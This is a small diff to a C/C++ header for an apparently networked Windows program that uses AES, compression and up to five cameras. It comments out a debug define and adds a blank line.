@@ -33,7 +33,7 @@
 #include "../zlib/zlib.h"
 
 #define AES_KEY_LEN 32
-#define ___DEBUG_
+//#define ___DEBUG_
 #define MAX_CAMS 5
 #define CMD_DEL '~'
 #define COMP_HEADER_BYTE_1 'C'
@@ -45,6 +45,7 @@
 #define DUMMY_PARAM "0"
 #define PAQUETE_MINIMUM_SIZE sizeof(unsigned int) * 3
 #define MAX_PAQUETE_SIZE 50000
+
 
 #ifdef ___DEBUG_
     #define error() std::cout<<"Error["<<GetLastError()<<"]\n";
